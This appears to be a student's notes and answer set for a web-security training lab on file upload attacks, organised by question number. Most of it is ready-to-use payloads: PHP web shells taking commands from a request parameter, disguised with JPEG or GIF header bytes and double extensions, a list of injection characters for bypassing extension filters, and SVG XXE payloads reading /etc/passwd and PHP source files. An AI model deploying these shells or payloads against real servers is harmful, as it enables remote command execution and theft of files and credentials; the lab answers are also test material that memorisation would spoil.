# Useful Links
[PHP extension list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
# Character Injection
Finally, let's discuss another method of bypassing a whitelist validation test through Character Injection. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

## The following are some of the characters we may try injecting:

```%20```
```%0a```
%00
%0d0a
/
.\
.
…
:

# Useful Shells

## Question 1
shell.php
```php
<?php system('hostname'); ?>
```

## Question 2
shell.php
```php
<?php system($_REQUEST['cmd']);?>
```

## Question 3
shell.php
```php
<?php system($_REQUEST['cmd']);?>
```

## Question 4
shell.phar
```php
<?php system($_REQUEST['cmd']);?>
```

## Question 5
shell.phar.jpg
```php
����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
<?php system($_REQUEST['cmd']);?>
```

## Question 6
shell.phar.gif
```php
GIF8
<?php system($_REQUEST['cmd']);?>
```
shell.gif.phar
```php
GIF8
<?php system($_REQUEST['cmd']);?>
```

## Question 7
shell.svg
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
shell2.svg
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```
shell3.svg
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc>
<svg>&xxe;</svg>
```

## Skills Assessment - File Upload Attacks

shell.svg
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

shell2.svg
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=common-functions.php"> ]>
<svg>&xxe;</svg>
```

shell.phar.jpeg
```php
����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
<?php system($_REQUEST['cmd']);?>
```

# Useful Code
[upload.php](https://github.com/r4fik1/HTB_Academy/blob/main/HTB_File_Upload_Attacks/Skill%20Assessment%20-%20File%20Upload%20Attacks/upload.php)

[common-functions.php](https://github.com/r4fik1/HTB_Academy/blob/main/HTB_File_Upload_Attacks/Skill%20Assessment%20-%20File%20Upload%20Attacks/common-functions.php)
